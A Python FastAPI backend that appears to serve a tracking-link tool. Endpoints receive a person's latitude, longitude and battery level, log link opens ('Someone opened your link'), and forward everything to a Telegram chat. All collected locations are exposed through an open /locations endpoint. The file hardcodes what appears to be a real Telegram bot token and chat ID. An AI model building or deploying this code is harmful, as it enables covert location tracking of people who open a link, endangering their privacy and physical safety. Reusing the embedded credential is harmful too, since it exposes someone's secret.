from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
import requests

app = FastAPI()

locations = []

TELEGRAM_TOKEN = "8521809713:AAFAZisC2JzlyeDax_EMBRuo6ebVQXGn4DQ"
CHAT_ID = "7675394721"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/location")
async def receive_location(request: Request):

    data = await request.json()

    locations.append(data)

    user = data.get("user")
    lat = data.get("latitude")
    lon = data.get("longitude")
    battery = data.get("battery")

    message = f"""
🚨 Location Update

User : {user}
Latitude : {lat}
Longitude : {lon}
Battery : {battery}%
"""

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": message
    })

    return {"status": "ok"}


@app.post("/visit")
async def visit(request: Request):

    data = await request.json()

    user = data.get("user")

    message = f"""
👀 Someone opened your link

User : {user}
"""

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": message
    })

    return {"status": "ok"}

@app.get("/locations")
async def get_locations():
    return locations


app.mount("/", StaticFiles(directory="frontend", html=True), name="frontend")